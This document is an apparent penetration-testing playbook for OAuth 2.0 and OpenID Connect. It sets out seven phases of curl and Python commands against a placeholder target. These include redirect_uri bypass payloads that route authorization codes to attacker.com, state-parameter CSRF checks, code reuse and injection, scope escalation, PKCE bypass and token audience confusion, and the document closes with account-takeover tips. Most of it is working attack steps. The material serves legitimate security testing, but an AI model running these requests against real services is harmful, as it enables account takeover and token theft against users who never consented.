# OAuth 2.0 / OpenID Connect Misconfigurations

Test OAuth flows for open redirect ATO, state bypass, token leakage, PKCE bypass, implicit flow abuse.

## Phase 1: Reconnaissance

```bash
# Discover OAuth endpoints:
curl -s "https://target.com/.well-known/openid-configuration" | jq .
curl -s "https://target.com/.well-known/oauth-authorization-server" | jq .
curl -s "https://target.com/oauth/.well-known/openid-configuration" | jq .

# Extract key endpoints:
OIDC=$(curl -s "https://target.com/.well-known/openid-configuration")
echo "Auth endpoint: $(echo $OIDC | jq -r '.authorization_endpoint')"
echo "Token endpoint: $(echo $OIDC | jq -r '.token_endpoint')"
echo "JWKS: $(echo $OIDC | jq -r '.jwks_uri')"

# Find client_id in JavaScript source:
curl -s "https://target.com/" | grep -oE 'client_id["\s:=]+["\x27][a-zA-Z0-9_-]+["\x27]'
curl -s "https://target.com/static/app.js" | grep -oE '"client_id":"[^"]+"'
```

---

## Phase 2: Open Redirect → Account Takeover

```bash
# If redirect_uri is loosely validated, steal auth code:

# Test open redirect with different bypass techniques:
CLIENT_ID="known_client_id"
AUTH_ENDPOINT="https://auth.target.com/oauth/authorize"

# Technique 1: Extra path after allowed URI:
EVIL_REDIRECT="https://allowed.target.com/callback/../../../attacker.com"
curl -s "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=$EVIL_REDIRECT&response_type=code"

# Technique 2: Parameter pollution:
EVIL_REDIRECT2="https://allowed.target.com/callback?redirect=https://attacker.com"
curl -s "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$EVIL_REDIRECT2'))")"

# Technique 3: Allowed domain as subdomain of attacker:
# allowed: target.com → try: target.com.attacker.com
EVIL_SUB="https://target.com.attacker.com/callback"

# Technique 4: URL fragment bypass:
EVIL_FRAG="https://allowed.target.com/callback#@attacker.com"

# Technique 5: Wildcard abuse:
# If allowed: https://app.target.com/* → try: https://app.target.com/redirect?url=attacker.com

# Test each:
for redirect in "$EVIL_REDIRECT" "$EVIL_REDIRECT2" "$EVIL_SUB" "$EVIL_FRAG"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$redirect")&response_type=code")
  echo "$STATUS → $redirect"
done
```

---

## Phase 3: State Parameter Bypass (CSRF on OAuth)

```bash
# No state parameter = CSRF attack on OAuth flow
# Attacker crafts authorization URL, victim clicks → attacker's code linked to victim account

# Test if state is required:
curl -s -L "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback&response_type=code" \
  -w "%{redirect_url}"

# Test if state is validated (reuse state across sessions):
# 1. Initiate legit OAuth flow → capture state value
# 2. Craft URL with same state value in different session
# 3. Complete flow → check if code is accepted

# Test reuse of same state multiple times:
STATE_VAL="predictable_or_captured_state"
curl -s "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback&response_type=code&state=$STATE_VAL"
# Second request with same state:
curl -s "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback&response_type=code&state=$STATE_VAL"
```

---

## Phase 4: Authorization Code Leakage

```bash
# Code in Referer header:
# When callback URL redirects to another page, code may be in Referer

# Check if code is logged or appears in URLs:
# After login, check page source for authorization codes:
curl -s "https://app.target.com/dashboard" -H "Cookie: SESSION" | \
  grep -oE 'code=[a-zA-Z0-9_-]+'

# Test code reuse (should be single-use):
CODE="captured_auth_code"
# Use code once:
curl -s -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://app.target.com/callback&client_id=$CLIENT_ID"
# Try to reuse:
curl -s -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://app.target.com/callback&client_id=$CLIENT_ID"

# Code injection — test if arbitrary code can be submitted:
curl -s -X POST "https://app.target.com/oauth/callback" \
  -d "code=attacker_code&state=valid_state"
```

---

## Phase 5: Token Endpoint Attacks

```bash
# Test client authentication bypass:
# Try submitting without client_secret:
curl -s -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback"

# Test implicit flow (response_type=token) — token in URL fragment:
curl -s -L "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback&response_type=token" \
  -w "%{redirect_url}" | grep -oE 'access_token=[^&]+'

# Scope escalation:
# Request higher scope than you're allowed:
curl -s "$AUTH_ENDPOINT?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback&response_type=code&scope=openid+email+admin+write:all"

# Token refresh abuse (unlimited refresh):
REFRESH_TOKEN="captured_refresh_token"
for i in $(seq 1 5); do
  NEW_TOKEN=$(curl -s -X POST "https://auth.target.com/oauth/token" \
    -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&client_id=$CLIENT_ID" | jq -r '.access_token')
  echo "Iteration $i: $NEW_TOKEN"
done
```

---

## Phase 6: PKCE Bypass (Mobile/SPA)

```bash
# PKCE protects public clients — test if verifier is actually checked

# Generate legitimate PKCE pair:
python3 -c "
import secrets, hashlib, base64

verifier = secrets.token_urlsafe(64)
challenge = base64.urlsafe_b64encode(
    hashlib.sha256(verifier.encode()).digest()
).rstrip(b'=').decode()

print('verifier:', verifier)
print('challenge:', challenge)
"

# Step 1: Initiate with code_challenge:
# Step 2: Try to exchange code WITHOUT code_verifier:
curl -s -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback"
  # Note: no code_verifier — if this succeeds, PKCE is not enforced

# Step 3: Try with wrong verifier:
curl -s -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=authorization_code&code=CODE&client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback&code_verifier=wrong_verifier"
```

---

## Phase 7: Misconfigured Token Validation

```bash
# Test if access token from one app works on another:
APP1_TOKEN="token_from_app1"
# Use on app2:
curl -s "https://app2.target.com/api/user" \
  -H "Authorization: Bearer $APP1_TOKEN"

# Test token audience (aud) confusion:
python3 -c "
import jwt, base64, json

# Decode without verification:
parts = '$APP1_TOKEN'.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print('Audience (aud):', payload.get('aud'))
print('Issuer (iss):', payload.get('iss'))
print('Client ID:', payload.get('azp'))
"

# Test if expired tokens are still accepted:
# Capture old token, test 1 hour later:
curl -s "https://app.target.com/api/profile" \
  -H "Authorization: Bearer EXPIRED_TOKEN"

# Test if token can be used across environments:
# Dev token on prod endpoint:
curl -s "https://api.target.com/v1/user" \
  -H "Authorization: Bearer DEV_TOKEN"
```

---

## Pro Tips

1. **Always check `redirect_uri` validation** — it's the most common OAuth bug (P1 severity)
2. **State = CSRF token** — missing/reusable state is exploitable if you can make victim visit URL
3. **Scope creep** — try requesting `admin`, `write:*`, `*`, `openid email phone address` in scope
4. **Look for code in Referer** — auth code in redirect URL gets leaked via Referer header to third-party resources
5. **PKCE on public clients** — SPAs and mobile apps should enforce PKCE; test without verifier
6. **Token audience** — access token for `api.target.com` shouldn't work on `app.target.com`
7. **implicit flow deprecated** — but still common; tokens in URL fragment are logged in browser history

## Summary

OAuth flow: discover endpoints via `.well-known` → grab client_id from JS → test redirect_uri validation (path traversal, subdomain) → check state requirement → test code reuse → test scope escalation → test PKCE enforcement → document redirect chain for ATO PoC.
